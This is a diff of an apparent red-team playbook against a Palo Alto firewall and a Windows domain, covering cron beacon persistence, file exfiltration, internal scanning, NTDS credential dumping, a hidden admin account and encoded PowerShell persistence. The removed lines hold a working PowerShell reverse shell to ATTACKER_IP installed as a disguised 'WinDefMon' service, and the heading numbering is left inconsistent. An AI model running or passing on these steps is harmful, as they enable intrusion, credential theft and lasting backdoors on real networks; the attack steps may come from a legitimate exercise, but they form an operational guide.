@@ -193,7 +193,7 @@ KG+Vs7e5$dF4
 
 - Now that you are fully set up, move to Phase 1.
 
-# Phase 1: Initial Access via Palo Alto Exploit
+## Phase 1: Initial Access via Palo Alto Exploit
 
 Section 1. Setting Up Listeners
 
@@ -222,7 +222,7 @@ Section 2. Execute the PoC Script
 
 
 
-# Phase 2: Palo Persistence
+## Phase 2: Palo Persistence
 
 Once you are in the Palo Alto's bash shell, remember that this shell has limited functionality. **Features like the tab key for autocompletion and the up/down arrow keys won’t work.** The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.
 
@@ -246,7 +246,7 @@ Once you are in the Palo Alto's bash shell, remember that this shell has limited
    `crontab -l`
    	NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.
 
-# Phase 3: Enumeration and Exfil
+## Phase 3: Enumeration and Exfil
 
 Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.
 
@@ -272,16 +272,6 @@ Now that we have a way to return to the system, let’s gather critical files co
    `exit`
 
 
-
-
-	
-   
-
-# Phase 4: Priv Esc
-
-
-
-
 # Phase 3: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
 ### Identify internal interfaces and routes
@@ -302,7 +292,7 @@ cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 - sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
 network.
 
-# Phase 3: Target Discovery Inside Orange Space
+# Phase 4: Target Discovery Inside Orange Space
 Assuming pivot success to internal hosts:
 #### Scan internal subnets for DC or LDAP
 ```bash
@@ -311,7 +301,7 @@ nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 
 - Look for the Domain Controller (likely in orange-servers or orange-users).
 
-# Phase 4: Credential Access (via LDAP, SAM/NTDS)
+# Phase 5: Credential Access (via LDAP, SAM/NTDS)
 - Once a DC is identified (e.g., 172.20.2.X), you can:
 	- 88, 389
 - Enumerate via LDAP (LOLBAS):
@@ -339,7 +329,7 @@ Then parse locally:
 ```bash
 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 ```
-# Phase 5: Lateral Movement and Persistence
+# Phase 6: Lateral Movement and Persistence
 Use Admin Shares:
 ```bash
 wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
@@ -355,54 +345,6 @@ net localgroup administrators stealthyUser /add
 ```bash
 schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
 ```
-## 🔧 Step-by-Step: Install `WinDefMon` Reverse Shell Service on DC
-
-### 1. 📜 **Reverse Shell Payload**
-
-Save this script as `C:\ProgramData\winmon.ps1` on the **Domain Controller**:
-
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",9999)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (iex $data 2>&1 | Out-String )
-    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte,0,$sendbyte.Length)
-    $stream.Flush()
-}
-$client.Close()
-```
-
----
-### 2. 🔐 **Base64 Encode It**
-
-```powershell
-$payload = Get-Content -Raw C:\ProgramData\winmon.ps1
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
-$encoded = [Convert]::ToBase64String($bytes)
-```
-
----
-### 3. ⚙️ **Create the Service as WinDefMon**
-
-```powershell
-$cmd = "powershell.exe -NoP -W Hidden -Enc $encoded"
-sc.exe create WinDefMon binPath= "$cmd" start= auto
-sc.exe start WinDefMon
-```
-
-💡 *Use quotes properly after `binPath=` and ensure the encoded string doesn't break on multiple lines if scripting.*
-
----
-### 4. 🧪 **Start Your Listener**
-
-```bash
-nc -lvnp 9999
-```
----
 
 Or use registry run keys:
 
@@ -413,18 +355,3 @@ REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
 ```
 
 Phase 6: OT Network Target Prep (Later Stage)
-
-
-
-
-
-
-
-# Teardown
-## 🧼 Teardown (DC)
-
-```powershell
-sc stop WinDefMon
-sc delete WinDefMon
-Remove-Item C:\ProgramData\winmon.ps1 -Force
-```
